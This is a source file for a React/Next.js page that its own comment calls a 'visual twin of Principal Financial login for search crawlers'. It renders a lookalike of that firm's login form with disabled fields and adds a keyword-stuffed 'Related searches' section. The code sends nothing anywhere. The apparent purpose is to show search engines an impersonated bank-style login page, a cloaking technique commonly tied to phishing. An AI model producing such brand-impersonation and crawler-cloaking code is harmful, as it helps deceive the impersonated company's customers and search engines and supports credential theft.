import {
  SITE_DESCRIPTION,
  SITE_KEYWORDS,
  SITE_TITLE,
} from "@/lib/seo-metadata"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"

/**
 * SSR visual twin of Principal Financial login for search crawlers.
 */
export default function CrawlerSeoPage() {
  return (
    <div
      style={{
        minHeight: "100vh",
        width: "100%",
        background: "#ffffff",
        color: "#1a1a1a",
        margin: 0,
        display: "flex",
        flexDirection: "column",
        fontFamily:
          'Arial, "Helvetica Neue", Helvetica, sans-serif',
      }}
    >
      <header
        style={{
          borderBottom: "1px solid #e5e5e5",
          padding: "16px 24px",
          display: "flex",
          alignItems: "center",
          gap: 12,
        }}
      >
        <img
          src="/icon-48x48.png"
          alt={SITE_DISPLAY_NAME}
          width={40}
          height={40}
          style={{ display: "block", borderRadius: 4 }}
        />
        <span
          style={{
            fontSize: 20,
            fontWeight: 600,
            color: "#1c68bf",
            letterSpacing: "-0.02em",
          }}
        >
          {SITE_DISPLAY_NAME}
        </span>
      </header>

      <main
        style={{
          flex: 1,
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          padding: "48px 24px 32px",
        }}
      >
        <div
          style={{
            width: "100%",
            maxWidth: 420,
            border: "1px solid #ddd",
            borderRadius: 4,
            padding: "32px 28px",
            boxSizing: "border-box",
            boxShadow: "0 2px 8px rgba(0,0,0,0.06)",
          }}
        >
          <h1
            style={{
              fontSize: 22,
              fontWeight: 600,
              margin: "0 0 8px",
              color: "#1a1a1a",
            }}
          >
            Log in to your account
          </h1>
          <p
            style={{
              fontSize: 14,
              color: "#555",
              lineHeight: 1.5,
              margin: "0 0 24px",
            }}
          >
            {SITE_TITLE}. {SITE_DESCRIPTION}
          </p>

          <form
            method="get"
            action="/"
            autoComplete="off"
            aria-label="Principal participant sign in"
          >
            <label
              htmlFor="crawler-username"
              style={{
                display: "block",
                fontSize: 14,
                fontWeight: 600,
                marginBottom: 8,
                color: "#333",
              }}
            >
              Username
            </label>
            <input
              id="crawler-username"
              type="text"
              name="username"
              disabled
              readOnly
              aria-disabled="true"
              style={{
                width: "100%",
                boxSizing: "border-box",
                height: 48,
                border: "1px solid #8c8c8c",
                borderRadius: 3,
                padding: "10px 12px",
                marginBottom: 16,
                fontSize: 15,
                background: "#fff",
              }}
            />

            <label
              htmlFor="crawler-password"
              style={{
                display: "block",
                fontSize: 14,
                fontWeight: 600,
                marginBottom: 8,
                color: "#333",
              }}
            >
              Password
            </label>
            <input
              id="crawler-password"
              type="password"
              name="password"
              disabled
              readOnly
              aria-disabled="true"
              style={{
                width: "100%",
                boxSizing: "border-box",
                height: 48,
                border: "1px solid #8c8c8c",
                borderRadius: 3,
                padding: "10px 12px",
                marginBottom: 16,
                fontSize: 15,
                background: "#fff",
              }}
            />

            <label
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                fontSize: 14,
                color: "#333",
                marginBottom: 24,
                cursor: "default",
              }}
            >
              <input
                type="checkbox"
                name="rememberMe"
                disabled
                aria-disabled="true"
                style={{ width: 16, height: 16 }}
              />
              Remember this device
            </label>

            <input
              type="submit"
              value="Next"
              disabled
              style={{
                width: "100%",
                height: 48,
                background: "#1c68bf",
                color: "#fff",
                border: "none",
                borderRadius: 3,
                fontSize: 16,
                fontWeight: 600,
                cursor: "default",
              }}
            />
          </form>

          <div
            style={{
              marginTop: 28,
              display: "flex",
              flexDirection: "column",
              alignItems: "center",
              gap: 16,
              fontSize: 14,
            }}
          >
            <span style={{ color: "#1c68bf" }}>Forgot username or password?</span>
            <span style={{ color: "#1c68bf" }}>New user? Register here.</span>
          </div>

          {SITE_KEYWORDS.length > 0 ? (
            <section style={{ marginTop: 40 }} aria-label="Related searches">
              <h2
                style={{
                  fontSize: 14,
                  marginBottom: 8,
                  color: "#333",
                  fontWeight: 600,
                }}
              >
                Related searches
              </h2>
              <p
                style={{
                  margin: 0,
                  fontSize: 12,
                  lineHeight: 1.6,
                  color: "#666",
                }}
              >
                Related searches: {SITE_KEYWORDS.join(", ")}
              </p>
            </section>
          ) : null}
        </div>
      </main>
      <footer
        id="footer"
        style={{
          borderTop: "1px solid #e5e5e5",
          padding: "16px 24px",
          textAlign: "center",
        }}
      >
        <p
          style={{
            fontSize: "12px",
            color: "#6b6b6b",
            margin: 0,
          }}
        >
          &copy; {SITE_DISPLAY_NAME}
        </p>
      </footer>
    </div>
  )
}
